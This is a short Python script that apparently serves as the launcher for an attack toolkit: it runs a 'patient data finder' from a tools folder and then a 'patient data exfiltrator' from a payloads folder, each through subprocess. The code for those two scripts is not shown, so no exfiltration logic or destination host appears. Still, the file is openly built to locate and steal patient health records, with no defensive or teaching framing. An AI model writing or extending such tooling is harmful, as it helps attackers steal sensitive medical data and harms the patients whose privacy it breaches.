import subprocess
import os

def main():
    # Run the patient data finder
    patient_data_finder_path = os.path.join(os.path.dirname(__file__), "tools", "patient_data_finder.py")
    subprocess.run(["python3", patient_data_finder_path])

    # Run the patient data exfiltrator
    patient_data_exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "patient_data_exfiltrator.py")
    subprocess.run(["python3", patient_data_exfiltrator_path])

if __name__ == "__main__":
    main()
